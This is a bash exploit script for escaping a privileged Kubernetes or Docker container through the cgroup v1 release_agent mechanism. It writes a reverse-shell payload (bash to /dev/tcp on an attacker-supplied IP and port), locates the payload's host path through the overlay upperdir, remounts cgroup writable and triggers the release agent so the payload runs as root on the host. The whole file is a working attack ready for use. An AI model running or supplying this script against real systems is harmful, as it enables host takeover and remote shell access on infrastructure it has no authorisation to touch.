#!/bin/bash
# Usage: ./cg-exploit.sh  <your-ip> <your-port>

RHOST="$1"
RPORT="$2"

# 1. Create payload on the container's filesystem (will be visible on host via overlay upperdir)
cat >/tmp/payload <<EOF
#!/bin/bash
bash -i >& /dev/tcp/${RHOST}/${RPORT} 0>&1 2>&1
EOF
chmod +x /tmp/payload

# 2. Get the host's absolute path to our payload (works on containerd overlayfs and docker overlay2)
UPPER=$(grep 'overlay.*upperdir=' /proc/mounts | awk -F'upperdir=' '{print $2}' | awk '{print $1}' | head -1)
if [ -z "$UPPER" ]; then
    echo "[-] No overlay upperdir found - your cluster might use a different storage driver"
    exit 1
fi
PAYLOAD_HOST_PATH="${UPPER}/tmp/payload"
echo "[+] Payload will be executed from host path: $PAYLOAD_HOST_PATH"

# 3. Find a usable v1 cgroup controller that supports release_agent
for controller in freezer memory cpu cpuacct devices pids blkio; do
    if [ -d "/sys/fs/cgroup/$controller" ]; then
        CGROOT="/sys/fs/cgroup/$controller"
        echo "[+] Using controller: $controller"
        break
    fi
done

if [ -z "$CGROOT" ]; then
    echo "[-] No v1 cgroup controller with release_agent support found (probably pure cgroup v2)"
    echo "    On pure cgroup v2 privileged pods you need a different technique (e.g. mount host disk)"
    exit 1
fi

# 4. Make sure we can write (kubelet often mounts cgroup RO - privileged lets us remount)
mount | grep "$CGROOT" | grep -q ro && mount -o remount,rw "$CGROOT" 2>/dev/null || true

# 5. Set up the attack cgroup
mkdir -p "$CGROOT/pwn"
echo 1 > "$CGROOT/pwn/notify_on_release"
echo "$PAYLOAD_HOST_PATH" > "$CGROOT/release_agent"

# 6. Trigger the release_agent (very reliable method)
(sleep 200 &)  # background long sleep
SPID=$!
echo $SPID > "$CGROOT/pwn/cgroup.procs"
kill -9 $SPID   # when it dies → empty cgroup → release_agent executes on host as root

echo "[+] Triggered - check your listener!"
